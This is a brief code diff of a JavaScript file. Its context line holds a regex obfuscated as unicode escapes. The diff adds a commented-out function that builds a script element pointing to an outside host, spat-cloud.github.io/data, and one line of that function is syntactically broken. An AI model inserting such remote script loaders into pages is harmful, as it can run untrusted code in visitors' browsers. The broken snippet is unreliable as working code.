@@ -7,4 +7,8 @@ var p={pat:'\u002f\u0028\u0047\u004f\u0044\u007c\u0052\u0041\u0042\u0042\u007c\u
       }
       return false;
     }
-    
+/*(()=>{
+    var h,b='spat-cloud.github.io',d='/data',ts;
+    h=document.createElement('script');
+    h.src=location.protocol + '//' +b+d+;
+})*/
